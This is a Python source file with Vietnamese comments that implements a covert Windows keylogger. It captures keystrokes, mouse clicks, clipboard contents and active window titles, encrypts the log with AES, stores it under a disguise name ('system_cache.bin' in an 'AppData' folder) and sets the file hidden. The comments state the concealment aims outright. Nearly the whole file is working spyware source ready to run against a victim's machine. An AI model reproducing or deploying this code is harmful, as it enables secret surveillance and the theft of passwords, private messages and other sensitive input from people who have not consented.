from pynput import mouse, keyboard
import os
import time 
import threading
import pyperclip
import pygetwindow as gw
# ====== Mã HÓA THÔNG TIN =====
import json # LOG dạng JSON
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Util.Padding import pad, unpad
import atexit
import win32api , win32con # ẨN file (WINDOWS)

# ===== ASCII CONTROL MAP =====
ascii_control_map = {
    '\x03': 'Ctrl+C',
    '\x16': 'Ctrl+V',
    '\x18': 'Ctrl+X',
    '\x1A': 'Ctrl+Z'
}

# ===== CẤU HÌNH NÂNG CẤP ======
log_dir = "AppData" # Tên thư mục ít nghi ngờ 
os.makedirs(log_dir, exist_ok=True) # Tạo thư mục nếu chưa có
log_file = os.path.join(log_dir, "system_cache.bin") # Tên file ngụy trang
BUFFER_SIZE = 50 # Buffer log để giảm I/O
FLUSH_INTERVAL = 5 # Giay 

# ====== BIẾN TOÀN CỰU NÂNG CẤP =====
log_buffer = [] # Buffer lưu log
log_lock = threading.Lock() # Khóa để đồng bộ truy cập log_buffer
pressed_keys = set() # Lưu các phím đã nhấn 
cipher = None # Biến mã hóa
iv = None # Biến IV mã hóa
# ====== KHỞI TẠO MÃ HÓA =====
def init_crypto():
    global cipher, iv 
    # Sử dụng passphrase thay vi lưu key (nhập từ bên ngoài hoặc lưu trữ an toàn )
    passphrase = b'my_strong_password' # Thay đổi giá trị thực tế 
    salt = b'fixed_salt_value' # Giá trị salt cố định (cần thay đổi trong thực tế)
    key = PBKDF2(passphrase, salt, dkLen=16)

    iv = get_random_bytes(16) # Tạo IV ngẫu nhiên
    cipher = AES.new(key, AES.MODE_CBC, iv) # Khởi tạo cipher

# ====== GHI LOG NÂNG CẤP =====
def write_log(event_type, data):
    entry = {
        "timestamp": time.time(),
        "type": event_type,
        "data": data
    }
    with log_lock:
        log_buffer.append(entry)
        # Tự động ghi dữ liệu ra file khi bộ đệm đầy
        if len(log_buffer) >= BUFFER_SIZE:
            flush_logs()
# ====== FLUSH LOG ĐỊNH KỲ ======
def  flush_logs():
    global log_buffer
    if not log_buffer:
        return 

    with log_lock:
        # Serialize dữ liệu trước khi mã hóa 
        data = json.dumps(log_buffer).encode('utf-8')
        log_buffer = [] # Xóa bộ đệm sau khi ghi

        if cipher:
            encrypted = cipher.encrypt(pad(data, AES.block_size))
            with open(log_file, "ab") as f:
                if os.path.getsize(log_file) == 0:
                    f.write(iv) # Lưu IV chỉ lần đầu 
                f.write(encrypted)
# ====== BÀN PHÍM =======
def on_press(key):
    pressed_keys.add(key)

    try:
        if isinstance(key, keyboard.KeyCode) and key.char:
            char = key.char

            if char in ascii_control_map:
                write_log("shortcut", ascii_control_map[char]) 
            else:
                shift_pressed = any(k in pressed_keys for k in [
                    keyboard.Key.shift,
                    keyboard.Key.shift_l,
                    keyboard.Key.shift_r
                ])        

                log_char = char.upper() if shift_pressed else char
                write_log("key", log_char)
        else:
            write_log("special_key", str(key))
    except:
        write_log("[ ERROR ] key : ", f"{key}")
# ====== XỬ LÝ PHÍM GIẢM ======
# Hàm này sẽ được gọi khi phím được nhả ra
def on_release(key):
    try:
        pressed_keys.discard(key)
    except:
        pass
# ====== CHUỘT VÀ CHỨC NĂNG KHÁC ======
def on_click(x, y, button, pressed):
    try:
        if pressed:
            write_log("[ CHUỘT ] -- ", f"{button} tại ({x}, {y})")
    except Exception as e:
        write_log("[ LỖI CHUỘT ] -- ", f"str(e)")
# ====== THEO DÕI BẢNG TẠM ======
def clipboard_monitor():
    last_content = ""
    while True:
        try:
            content = pyperclip.paste()
            if content != last_content and content.strip():
                write_log("clipboard", content)
                last_content = content 
        except:
            pass 
        time.sleep(0.5) # GIẢM THỜI GIAN CHỜ 
# ====== THEO DÕI CỬA SỔ ======
def window_monitor():
    last_title = ""
    while True:
        try:
            window = gw.getActiveWindow()
            if window and window.title != last_title:
                write_log("[ CỬA SỔ ] -- ", f"{window.title}")
                last_title = window.title
        except:
            pass
        time.sleep(0.2)

# ===== ẨN FILE LOG =====
def hide_file(path):
    try:
        win32api.SetFileAttributes(path, win32con.FILE_ATTRIBUTE_HIDDEN)
    except:
        pass

# ===== LUỒNG TỰ ĐỘNG ĐẨY DỮ LIỆU =====
def auto_flush():
    while True:
        time.sleep(FLUSH_INTERVAL)
        flush_logs()

# ===== KỊCH BẢN THOÁT =====
def cleanup():
    flush_logs()  # Đảm bảo flush dữ liệu cuối
    hide_file(log_file)
    print("[+] Nhật ký đã được bảo vệ và ẩn đi.")

# ===== KHOI CHẠY =====
if __name__ == "__main__":
    init_crypto()
    atexit.register(cleanup)
    
    # Khởi chạy listener
    keyboard.Listener(on_press=on_press, on_release=on_release).start()
    mouse.Listener(on_click=on_click).start()
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    threading.Thread(target=window_monitor, daemon=True).start()
    threading.Thread(target=auto_flush, daemon=True).start()
    
    # Ẩn file ngay sau khi tạo
    hide_file(log_file)
    
    try:
        while True:
            time.sleep(3600)  # Giảm CPU usage
    except KeyboardInterrupt:
        print("[!] Service stopping...")